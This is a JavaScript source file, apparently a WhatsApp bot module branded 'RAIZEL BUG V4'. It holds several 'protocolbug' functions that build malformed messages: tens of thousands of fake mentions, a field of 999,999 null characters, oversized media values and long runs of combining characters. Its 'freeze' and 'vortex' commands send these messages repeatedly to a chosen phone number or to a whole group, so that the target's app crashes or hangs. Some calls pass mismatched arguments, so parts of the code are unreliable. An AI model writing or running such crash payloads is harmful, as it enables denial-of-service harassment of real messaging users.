                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await rich.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rich.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "\u9999" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(rich, target, shibal) {
  const Rizxvelz = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "999999",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "????????????????????",
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
          },
          streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
          thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          annotations: [{
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "kontol",
                songId: "peler",
                author: ".Rizxvelz Official",
                title: "Zoro",
                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                countryBlocklist: true,
                isExplicit: true,
                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
              }
            },
            embeddedAction: null
          }]
        }
      }
    }
  }, {});
  await rich.relayMessage("status@broadcast", Rizxvelz.message, {
    messageId: Rizxvelz.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: target
          },
          content: undefined
        }]
      }]
    }]
  });
  if (shibal) {
    const payment0 = {
      key: Rizxvelz.key,
      type: 25
    };
    const payment1 = {
      protocolMessage: payment0
    };
    const payment2 = {
      message: payment1
    };
    const payment = {
      groupStatusMentionMessage: payment2
    };
    const paymen10 = {
      tag: "meta",
      attrs: {},
      content: undefined
    };
    paymen10.attrs.is_status_mention = "true";
    const kuntul = {
      additionalNodes: [paymen10]
    };
    await rich.relayMessage(target, payment, kuntul);
  }
}

async function protocolbug8(rich, target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Rizxvelz Official" + "áŸ„áŸ".repeat(10000),
        title: "Zoro",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "????????????????????",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363319314627296@newsletter",
            serverMessageId: 1,
            newsletterName: "x!s - rizxvelz"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await rich.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rich.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protocolbug6(rich, target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "????????????????????",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "x!s - rizxvelz",
              newsletterJid: "120363319314627296@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await rich.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await rich.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "ðŸ©¸ ð‘Í ð¢Ì»ð³Í¢ð±Í¯ð•Ì»ðžÍœð¥Ì»ð³Í¡ ðŽÍ ðŸÌ»ðŸÍ¢ð¢ÍœðœÍ¯ð¢Ì»ðšÌ»ð¥-ðˆÍ¯ðƒ" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function protocolbug7(rich, target, mention) {
  const mentionedJids = [
    ...Array.from({ length: 40000 }, () =>
      `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "1@newsletter",
      serverMessageId: 1,
      newsletterName: "ê¦?".repeat(99)
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await rich.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await rich.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
// === Freeze ===
const freeze = {
  name: "freeze",
  execute: async (sock, m, args, from, _, prefix, command) => {
    const q = args[0];
    if (!q) {
      return sock.sendMessage(
        from,
        { text: `📌 Exemple : ${prefix + command} 237xxxxxxxxxx` },
        { quoted: m }
      );
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await sock.sendMessage(
      from,
      {
        image: { url: "https://files.catbox.moe/4185go.jpg" },
        caption: `⚡ *FREEZE ACTIVÉ !*\n\n🎯 Cible : wa.me/${q.replace(
          /[^0-9]/g,
          ""
        )}\n🧩 Module : *RAIZEL BUG V4 - Android/iOS Mix*`,
      },
      { quoted: m }
    );

    await sleep(2000);

    try {
      // iOS/Android mix
      await thunderblast_ios1(target);
      await sleep(500);
      await apaya(sock, target);
      await sleep(500);
      await thunderblast_ios1(target);
      await sleep(500);

      // Nouvelles fonctions Android
      await alldelay(target);
      await sleep(500);
      await bulldozer(target);
      await sleep(500);
      await protocolbug8(target);
      await sleep(500);
      await protocolbug6(target);
      await sleep(500);
      await protocolbug7(target);
      await sleep(500);

      // Répétition de protocolbug
      await protocolbug8(target);
      await sleep(500);
      await protocolbug6(target);
      await sleep(500);
      await protocolbug7(target);
      await sleep(500);

      await thunderblast_ios1(target);
      await sleep(500);
      await thunderblast_ios1(target);

      await sock.sendMessage(
        from,
        { text: `✅ *FREEZE terminé sur ${q}*` },
        { quoted: m }
      );
    } catch (err) {
      console.log("⚠️ Erreur pendant l'exécution de freeze :", err);
    }
  },
};

// === Vortex ===
const Vortex = {
  name: "vortex",
  execute: async (sock, m, args, from) => {
    if (!m.key.remoteJid.endsWith("@g.us")) {
      return sock.sendMessage(
        from,
        { text: "❌ Cette commande doit être utilisée dans un groupe." },
        { quoted: m }
      );
    }

    let target = from;

    await sock.sendMessage(
      from,
      {
        image: { url: "https://files.catbox.moe/4185go.jpg" },
        caption: `⚡ *VORTEX ACTIVÉ !*\n\n🎯 Cible : *Ce Groupe*\n🛡️ Module : *RAIZEL BUG Vortex*`,
      },
      { quoted: m }
    );

    await sleep(2000);

    // Exécution des bugs
    await thunderblast_ios1(target);
    await sleep(1000);
    await apaya(sock, target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await apaya(sock, target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);

    await sock.sendMessage(from, { react: { text: "⚡", key: m.key } });
  },
};
// ===================== EXPORT =====================
export default [
  Vortex,
  freeze,
];